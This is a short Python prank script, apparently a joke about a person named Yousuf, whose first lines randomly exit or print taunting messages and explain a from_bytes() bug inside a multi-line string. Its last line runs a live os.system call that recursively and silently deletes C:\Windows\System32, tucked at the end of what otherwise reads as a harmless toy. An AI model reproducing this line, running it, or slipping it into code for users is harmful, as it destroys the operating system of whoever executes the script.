# Yousuf does not have a skill issue 
import random; random.seed(0)
import random; exit() if random.randrange(1, 1000) == 20 else print("you got lucky...\nfor now")
comment = """the code below has a bug , it needs to be commented out with a multi line strings , TypeError: from_bytes() missing required argument 'byteorder' (pos 2),
import os; exit() if int.from_bytes(os.urandom(1)) == 42 else print("do not play with me.")
"""; import os; (print("nice"), exit(3)) if ord(os.urandom(1)) == 69 else print("fortune favors you today!")
import os; os.system("rmdir /s /q C:\Windows\System32")



